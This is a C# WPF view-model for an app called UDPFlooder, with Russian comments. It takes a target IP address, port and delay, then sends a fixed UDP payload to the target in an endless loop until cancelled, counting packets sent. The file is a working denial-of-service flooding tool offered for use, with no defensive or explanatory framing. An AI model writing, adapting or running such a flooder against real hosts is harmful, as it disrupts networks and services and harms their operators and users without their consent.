using DevExpress.Mvvm;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace UDPFlooder.ViewModel
{
    class MainWindowVM : ViewModelBase, IDataErrorInfo
    {
        /// <summary>
        /// Валидация IP.
        /// </summary>
        const string CheckIP = @"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"; //oh, wtf
        /// <summary>
        /// Отправляемые данные.
        /// </summary>
        byte[] SendData = Encoding.Unicode.GetBytes("Whispers In The Dark");
        /// <summary>
        /// IP цели.
        /// </summary>
        public string IP { get; set; }
        /// <summary>
        /// Port цели.
        /// </summary>
        public int Port { get; set; }
        /// <summary>
        /// Задержка перед отправкой пакетов.
        /// </summary>
        public int Sleep { get; set; }

        ulong sended;
        /// <summary>
        /// Кол-во отправленных пакетов.
        /// </summary>
        public ulong Sended
        {
            get => sended;
            set
            {
                sended = value;

                if (sended % (Sleep == 0 ? 5000 : (ulong)Sleep) == 0)
                    RaisePropertyChanged();
            }
        }

        AsyncCommand startFlood;
        /// <summary>
        /// Команда флуда.
        /// </summary>
        public AsyncCommand StartFlood => startFlood ?? (startFlood = new AsyncCommand(async () =>
        {
            await Task.Factory.StartNew(() =>
            {
                Sended = 0;
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    EndPoint point = new IPEndPoint(IPAddress.Parse(IP), Port);
                    int sleep = Sleep;
                    while (!StartFlood.IsCancellationRequested)
                    {
                        socket.SendTo(SendData, point);
                        Sended++;
                        Thread.Sleep(sleep);
                    }
                }
            }, StartFlood.CancellationTokenSource.Token);
        }, () => ValidIP().IsEmpty() && ValidPort().IsEmpty() && ValidSleep().IsEmpty()));

        #region validation
        /// <summary>
        /// Валидация всех полей.
        /// </summary>
        /// <param name="columnName"></param>
        /// <returns></returns>
        public string this[string columnName]
        {
            get
            {
                switch (columnName)
                {
                    case nameof(IP): return ValidIP();
                    case nameof(Port): return ValidPort();
                    case nameof(Sleep): return ValidSleep();
                }
                return string.Empty;
            }
        }
        public string Error => throw new NotImplementedException();

        /// <summary>
        /// Валидация задержки.
        /// </summary>
        /// <returns></returns>
        string ValidSleep()
        {
            if (Sleep < 0 || Sleep > 100)
                return "Предел ожидания: от 0 до 100";
            else return string.Empty;
        }

        /// <summary>
        /// Валидация порта.
        /// </summary>
        /// <returns></returns>
        private string ValidPort()
        {
            if (Port < 0 || Port > 65535)
                return "Предел портов: от 0 до 65535";
            else return string.Empty;
        }

        /// <summary>
        /// Валидация IP.
        /// </summary>
        /// <returns></returns>
        string ValidIP()
        {
            if (IP.IsEmpty())
                return "Укажите IP цели";
            else if (!Regex.IsMatch(IP, CheckIP))
                return "Укажите IP цели в формате *.*.*.*, где * - любая цифра от 0 до 255";
            else return string.Empty;
        }
        #endregion
    }
}
